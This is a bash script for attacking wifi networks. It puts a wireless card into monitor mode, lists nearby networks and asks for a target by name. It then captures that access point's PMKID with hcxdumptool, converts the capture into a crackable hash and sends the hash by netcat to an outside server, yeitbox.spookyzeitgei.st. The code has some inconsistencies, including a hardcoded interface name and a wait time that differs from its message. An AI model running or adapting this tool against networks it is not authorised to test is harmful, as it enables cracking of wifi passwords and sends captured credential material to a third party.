#!/bin/bash

# quick and dirty script to set up monitor mode
function set_monitor {
	sudo ifconfig ${wifi_interface} down
	sudo iwconfig ${wifi_interface} mode monitor
	sudo ifconfig ${wifi_interface} up
}

function set_managed {
	sudo ifconfig ${wifi_interface} down
	sudo iwconfig ${wifi_interface} mode managed
	sudo ifconfig ${wifi_interface} up
}

# run with sudo

# get wifi interface name; mine has ralink in the chipset, change yours accordingly
printf "Info:Getting wifi interface...\n"

wifi_interface=$(sudo airmon-ng | grep -i ralink | awk '{print $2}')

printf "Info:Setting wifi to managed mode...\n"

set_managed

sleep 15

printf "Info:Wifi interface name: $wifi_interface.\n"

# find all networks
printf "Info:Finding all nearby networks...\n"

network_list=$(sudo iwlist ${wifi_interface} scan)

printf "Info:Networks found.\n"

printf "Info:Parsing network list...\n"
# remove blank network names + SSIDs from output
network_list=$(sudo iwlist sleuth scan  | sed -n -e 's/^.*Address: //p' -e 's/^.*SSID://p' | sed -e 'N;s/\(.*\)\n\(.*\)/\2,\1/' -e 's/"//g' | awk -F, '!/^,/{print "Network: "$1", Mac Address: "$2}')

printf "Info:\n${network_list}\n"
# set the interface to monitoring mode

printf "Info:Setting ${wifi_interface} to monitor mode...\n"

set_monitor

sleep 1

printf "Info:${wifi_interface} set to monitor mode.\n"

printf "Interactive mode: Enter network name to capture \u001b[31mPKMID\u001b[0m from:\n"

read target

SSID_address=$(echo "$network_list" | grep $target)
SSID_address=${SSID_address: -17}
printf "Info: Access Point address: ${SSID_address}\n"

echo "${SSID_address}" > target_list.out

printf "Targetting ${target}...\n"

$(sudo hcxdumptool -i sleuth --filterlist_ap target_list.out --filtermode=2 --disable_client_attacks -o ${target}.pcapng) & pid=$!

printf "Attempting to get PMKID, waiting 30 seconds...\n"

sleep 120
kill $pid

printf "Converting pcap to hash...\n"

hcxpcapngtool ${target}.pcapng -o ${target}_pmkid.hash 

hash=$(cat ${target}_pmkid.hash)

printf "Hash for ${target}: ${hash}\n"

printf "Info: Sending PMKID hash to remote server..."

echo "${hash}" | nc yeitbox.spookyzeitgei.st 22200

printf "Info: PMKID hash sent!"

printf "Info: Script done, setting ${wifi_interface} back to managed.\n"

set_managed


